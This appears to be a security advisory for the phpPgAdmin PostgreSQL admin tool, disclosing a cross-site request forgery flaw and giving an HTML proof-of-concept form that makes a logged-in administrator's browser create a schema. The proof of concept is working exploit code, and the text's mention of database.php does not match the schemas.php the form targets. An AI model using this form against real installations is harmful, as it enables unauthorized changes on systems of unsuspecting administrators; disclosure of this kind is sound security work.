# Overview

`phppgadmin/phppgadmin` is a web-based administration tool for PostgreSQL. It is perfect for PostgreSQL DB newbies and hosting services, this package is vulnerable to Cross-site Request Forgery (CSRF).

Multiple areas within the application allows sensitive actions to be performed without validating that the request originated from the application. One such area, `database.php`, does not verify the source of an HTTP request. This can be leveraged by a remote attacker to trick a logged-in administrator to visit a malicious page with a CSRF exploit and execute arbitrary system commands on the server.

# Proof of Concept

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localtest.me:9001/schemas.php" method="POST">
      <input type="hidden" name="formName" value="HACKED" />
      <input type="hidden" name="formAuth" value="mik317" />
      <input type="hidden" name="formComment" value="HACKED" />
      <input type="hidden" name="action" value="create" />
      <input type="hidden" name="database" value="test1" />
      <input type="hidden" name="server" value="&#58;5432&#58;allow" />
      <input type="hidden" name="database" value="test1" />
      <input type="hidden" name="create" value="Create" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```
